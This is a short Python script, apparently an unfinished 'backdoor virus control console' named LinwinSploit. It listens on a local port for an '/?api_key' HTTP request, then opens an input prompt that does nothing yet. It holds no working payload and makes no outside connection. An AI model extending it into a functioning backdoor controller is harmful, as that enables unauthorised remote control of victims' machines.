import socket
import requests
import sys
import urllib

start_port: int
connect_host: str = ""

def wait_for_client():
    try:
        get_connect = socket.socket()
        get_connect.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR , 1)
        get_connect.bind(("127.0.0.1",start_port))
        get_connect.listen()

        while True:
            conn, addr = get_connect.accept()
            try:
                client_message = conn.makefile().readline()
                requests_url: str = client_message[client_message.index(" ")+1:client_message.rfind("H")-1]
                requests_url: str = requests_url.strip()
                requests_url: str = urllib.parse.unquote(requests_url)

                if requests_url == '/?api_key':
                    #connect_host = socket.gethostbyname(conn.getsockname())
                    #print(connect_host)

                    conn.send(bytes("HTTP/1.1 200 OK\nContent-Type:text/html\n\nok".encode()))
                    conn.close()
                    break
                else:
                    conn.send(bytes("HTTP/1.1 200 OK\nContent-Type:text/html\n\nerror".encode()))
                    conn.close()
            except:
                conn.send(bytes("error".encode()))
                conn.close()
    except:
        print("error")
        exit(0)

if __name__ == '__main__':
    #print(sys.argv[1])
    start_port = int(sys.argv[1])
    wait_for_client()

    print("\n Backdoor Virus Control Consoele.\n")
    while True:
        command = input("LinwinSploit> ")

